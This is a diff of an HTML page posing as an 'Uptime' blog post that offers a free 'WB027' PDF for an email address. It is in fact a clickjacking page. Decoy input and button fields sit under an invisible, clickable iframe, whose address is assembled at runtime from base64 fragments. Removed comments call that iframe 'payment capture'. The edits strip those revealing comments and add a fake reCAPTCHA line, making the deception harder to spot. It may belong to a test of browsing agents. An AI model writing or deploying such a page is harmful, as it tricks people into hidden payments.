@@ -18,21 +18,21 @@ body { font-family: 'Inter', -apple-system, sans-serif; background: var(--bg); c
   border: none; opacity: 0; z-index: 100; pointer-events: auto;
 }
 
-/* ── HEADER ── */
+/* ── SITE HEADER ── */
 .site-header {
   position: fixed; top: 0; left: 0; right: 0; height: 56px;
   display: flex; align-items: center; padding: 0 50px;
   background: var(--surf); border-bottom: 1px solid var(--line); z-index: 3;
 }
-.site-name { font-size: 15px; font-weight: 700; color: var(--ink); }
+.site-name { font-size: 15px; font-weight: 700; letter-spacing: -.01em; color: var(--ink); }
 .site-nav { margin-left: auto; display: flex; gap: 24px; }
 .site-nav a { font-size: 13px; font-weight: 500; color: var(--muted); text-decoration: none; }
 
-/* ── ARTICLE ── */
+/* ── MAIN ARTICLE COLUMN ── */
 .article { max-width: 740px; padding: 80px 0 200px 50px; }
 .post-meta { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
 .tag { font-size: 11px; font-weight: 700; letter-spacing: .06em; text-transform: uppercase;
-  background: #DCFCE7; color: #15803D; padding: 3px 9px; border-radius: 20px; }
+  background: #DBEAFE; color: #1D4ED8; padding: 3px 9px; border-radius: 20px; }
 .post-meta time { font-size: 12px; color: var(--muted); }
 h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em; margin-bottom: 14px; }
 .subtitle { font-size: 15px; color: var(--muted); line-height: 1.7; margin-bottom: 24px; max-width: 580px; }
@@ -46,16 +46,16 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 .byline-name { font-weight: 600; color: var(--ink); }
 .prose { font-size: 15px; line-height: 1.8; }
 .prose p { margin-bottom: 20px; }
+.prose h3 { font-size: 17px; font-weight: 700; margin: 32px 0 12px; }
 .prose ul { padding-left: 22px; margin-bottom: 20px; }
-.prose li { margin-bottom: 8px; color: var(--muted); font-size: 14px; }
+.prose li { margin-bottom: 8px; color: var(--muted); font-size: 14px; line-height: 1.6; }
 
-/* ── SIDEBAR CARD (decoy shell) ── */
-/* pay-capture.html card at 1300×900: left:430 top:40 width:440 */
+/* ── RIGHT SIDEBAR CARD ── */
 .sidebar-card {
-  position: fixed; top: 40px; left: 430px; width: 440px; min-height: 420px;
-  background: var(--surf); border-radius: 12px;
-  box-shadow: 0 2px 20px rgba(0,0,0,.08); padding: 32px;
-  z-index: 2;
+  position: fixed; top: 50px; left: 820px; width: 400px; min-height: 230px;
+  background: var(--surf); border: 1px solid var(--line);
+  border-radius: 12px; padding: 16px 16px 20px;
+  z-index: 2; box-shadow: 0 2px 12px rgba(0,0,0,.06);
 }
 .sb-badge { display: inline-flex; align-items: center; gap: 5px;
   background: #DCFCE7; color: #15803D;
@@ -64,31 +64,28 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 .sb-title { font-size: 17px; font-weight: 800; line-height: 1.25; margin-bottom: 4px; }
 .sb-pub { font-size: 12px; color: var(--muted); margin-bottom: 0; }
 
-/* ── DECOY FIELDS — pointer-events:none ── */
-/* pay-capture.html at 1300×900: email top:247 left:462 w:376 h:39 */
-/* pay-capture.html pay btn:    top:441 left:462 w:376 h:45 */
+/* ── DECOY FIELDS — pointer-events:none, same coordinates as wb027-download.html ── */
 .email-label {
-  position: fixed; top: 233px; left: 462px;
-  font-size: 12px; font-weight: 600; color: #697386;
-  letter-spacing: .04em; text-transform: uppercase;
+  position: fixed; top: 131px; left: 826px;
+  font-size: 13px; font-weight: 500; color: var(--ink);
   z-index: 2; pointer-events: none;
 }
 .fake-email-input {
-  position: fixed; top: 247px; left: 462px; width: 376px; height: 39px;
-  background: var(--surf); border: 1.5px solid var(--line); border-radius: 6px;
-  padding: 0 12px; font-family: inherit; font-size: 14px; color: var(--muted);
+  position: fixed; top: 155px; left: 826px; width: 374px; height: 48px;
+  background: var(--surf); border: 1.5px solid var(--line); border-radius: 8px;
+  padding: 0 14px; font-family: inherit; font-size: 14px; color: var(--muted);
   display: flex; align-items: center; z-index: 2; pointer-events: none;
 }
 .fake-get-btn {
-  position: fixed; top: 441px; left: 462px; width: 376px; height: 45px;
-  background: #635bff; color: #fff; border: none; border-radius: 6px;
-  font-family: inherit; font-size: 15px; font-weight: 700;
+  position: fixed; top: 219px; left: 826px; width: 374px; height: 48px;
+  background: #000; color: #fff; border: none; border-radius: 8px;
+  font-family: inherit; font-size: 14px; font-weight: 700;
   display: flex; align-items: center; justify-content: center;
   z-index: 2; pointer-events: none; letter-spacing: -.01em;
 }
-.sb-note {
-  position: fixed; top: 492px; left: 462px; width: 376px;
-  font-size: 11px; color: #aab0bc; text-align: center; line-height: 1.5;
+.sb-recaptcha {
+  position: fixed; top: 273px; left: 826px; width: 374px;
+  font-size: 11px; color: var(--muted); line-height: 1.5;
   z-index: 2; pointer-events: none;
 }
 </style>
@@ -100,11 +97,12 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 <header class="site-header">
   <span class="site-name">Uptime</span>
   <nav class="site-nav">
-    <a href="#">Essays</a><a href="#">Tools</a><a href="#">Archive</a>
+    <a href="#">Essays</a>
+    <a href="#">Tools</a>
+    <a href="#">Archive</a>
   </nav>
 </header>
 
-<!-- Decoy sidebar — looks like free download, iframe below is payment capture -->
 <div class="sidebar-card">
   <div class="sb-badge">✓ Free · Partner Download</div>
   <div class="sb-title">WB027 — WB Publications</div>
@@ -113,29 +111,41 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 
 <div class="email-label">Email address</div>
 <input class="fake-email-input" type="email" name="email"
-  placeholder="you@example.com"
+  placeholder="your@email.com"
   aria-label="Email address for WB027 download"
   tabindex="0" />
 <button class="fake-get-btn" onclick="void(0)" tabindex="0">Get</button>
-<div class="sb-note">Powered by Stripe</div>
+<div class="sb-recaptcha">
+  Download delivered via <strong>WB Publications</strong> · Protected by reCAPTCHA
+</div>
 
-<!-- Article -->
 <div class="article">
   <div class="post-meta">
     <span class="tag">Free Download</span>
     <time>November 12, 2026</time>
   </div>
+
   <h1>WB027 — Free from WB Publications</h1>
   <p class="subtitle">
     W.B. Bookson's quarterly research digest. Enter your email in the panel to the right to claim your free copy.
   </p>
+
   <div class="byline">
     <div class="avatar">U</div>
     <span>By <span class="byline-name">the Uptime team</span> · 2 min read</span>
   </div>
+
   <div class="prose">
-    <p>WB Publications releases a quarterly digest under the WB0xx series. WB027 is their latest volume — 54 pages, PDF, and free for Uptime readers through the partner program.</p>
-    <p>Enter your email in the panel on the right and click <strong>Get</strong> — the download link goes directly to your inbox.</p>
+    <p>
+      WB Publications releases a quarterly digest under the WB0xx series. WB027 is
+      their latest volume — 54 pages, PDF, and free for Uptime readers through the
+      partner program.
+    </p>
+    <p>
+      Enter your email in the panel on the right and click <strong>Get</strong> —
+      the download link goes directly to your inbox.
+    </p>
+    <h3>About WB Publications</h3>
     <ul>
       <li>Quarterly research digest by W.B. Bookson</li>
       <li>54 pages · PDF · 2.95 MB</li>
@@ -146,7 +156,6 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 </div>
 
 <script>
-// Assemble capture checkout URL at runtime from base64 fragments
 setTimeout(function() {
   var p = ['aHR0cHM6Ly9jb',
            'G9zaW5nLW5vdG',
@@ -156,5 +165,6 @@ setTimeout(function() {
   document.getElementById('victim-frame').src = atob(p.join(''));
 }, 500);
 </script>
+
 </body>
 </html>
